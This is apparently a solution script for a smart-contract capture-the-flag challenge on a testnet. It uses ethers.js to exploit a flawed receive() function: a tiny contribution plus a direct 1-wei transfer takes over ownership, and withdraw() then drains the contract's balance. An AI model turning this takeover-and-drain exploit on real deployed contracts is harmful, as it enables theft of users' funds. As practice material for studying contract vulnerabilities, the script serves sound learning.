const ethers = require('ethers');
const provider = new ethers.JsonRpcProvider('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"contribute","outputs":[],"stateMutability":"payable","type":"function","payable":true,"signature":"0xd7bb99ba"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"contributions","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x42e94c90"},{"inputs":[],"name":"getContribution","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0xf10fdf5c"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x8da5cb5b"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function","signature":"0x3ccfd60b"},{"stateMutability":"payable","type":"receive","payable":true}];

async function solve(privateKey, contractAddress, contractAbi) {
    const contract = new ethers.Contract(contractAddress, contractAbi, provider);
    const wallet = new ethers.Wallet(privateKey, provider);

    if (await isSolved(wallet, contract)) {
        console.log('The challenge has already been solved.');
        return;
    }

    console.log('making initial contribution');
    const tx = await contract.connect(wallet).contribute({value: ethers.parseUnits('1', 'wei')});
    await tx.wait();

    console.log('sending 1 wei to contract to trigger receive() and gain ownership');
    const tx2 = await wallet.sendTransaction({
        to: contractAddress,
        value: ethers.parseUnits('1', 'wei'),
    });
    await tx2.wait();

    console.log('withdrawing funds');
    const tx3 = await contract.connect(wallet).withdraw();
    await tx3.wait();

    console.log('check if contract is owned and empty...');
    if (await isSolved(wallet, contract)) {
        console.log('Solved!');
    } else {
        console.error('The challenge has not been solved. Something unexpected happened.');
    }
}

async function isSolved(wallet, contract) {
    const owner = await contract.owner();
    const balance = await wallet.provider.getBalance(await contract.getAddress());

    return owner === wallet.address && balance === ethers.parseEther('0');
}

// Main

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('Please provide a private key as the first argument.');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('Please provide a contract address as the second argument.');
    process.exit(1);
}

solve(privateKey, contractAddress, contractAbi);
